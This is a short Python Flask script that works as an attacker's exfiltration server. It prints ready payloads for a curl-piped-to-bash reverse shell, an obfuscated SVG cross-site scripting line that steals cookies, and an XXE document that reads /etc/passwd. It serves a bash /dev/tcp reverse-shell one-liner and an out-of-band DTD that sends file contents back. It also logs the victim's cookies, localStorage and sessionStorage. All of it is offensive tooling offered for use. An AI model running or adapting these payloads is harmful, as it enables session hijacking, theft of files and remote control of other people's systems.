#!/usr/bin/env python3
from flask import Flask,Response,request
import sys
import logging
log=logging.getLogger('werkzeug')
log.disabled=True
cli=sys.modules['flask.cli']
cli.show_server_banner=lambda*x:None
a=Flask(__name__)
l={}
print(r"""
** Exfil using routes! **
shell     curl+http://<address>/rev/443|bash
session   <svg%0Conload="\u0064ocument.write('<img%0Csrc=http://<address>?c='%2b\u0064ocument.cookie%2b'>')"/>
file      <?xml version="1.0"?><!DOCTYPE x SYSTEM "http://<address>/dtd?file=/etc/passwd"><x>&e1;</x>
""")
@a.route('/rev/<int:p>')
def r(p):
 ip=request.host.split(':')[0]if':'in request.host else request.host
 payload=f'bash -i >& /dev/tcp/{ip}/{p} 0>&1'
 return Response(payload,mimetype='text/plain')
@a.route('/dtd')
def dtd():
 f=request.args.get('file')
 if f:
  l[request.remote_addr]=f
  return Response(f'<!ENTITY % file SYSTEM "file://{f}"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://{request.host}/dtd?data=%file;\'>">%eval;%exfil;',mimetype='application/xml')
 data=request.args.get('data')
 if data:
  print('----------------------------------------------------')
  print('\033[92mConnected\033[0m')
  print('Host: '+request.remote_addr)
  print('User-Agent: '+request.headers.get('User-Agent',''))
  print('File: '+l.get(request.remote_addr,''))
  print(data)
  print('----------------------------------------------------')
  print()
  return'',204
 return'',204
@a.route('/',methods=['GET','POST'])
def h():
 d=request.args.get('c')or request.get_data(as_text=True)or''
 if d:
  p=d.split(',')
  print('----------------------------------------------------')
  print('\033[92mConnected\033[0m')
  print('Host: '+request.remote_addr)
  print('User-Agent: '+request.headers.get('User-Agent',''))
  print('Cookies: '+(p[0]if len(p)>0 else''))
  print('localStorage: '+(p[1]if len(p)>1 else''))
  print('sessionStorage: '+(p[2]if len(p)>2 else''))
  print('----------------------------------------------------')
  print()
 return'',204
if __name__=="__main__":
 a.run(host='0.0.0.0',port=80,debug=False)
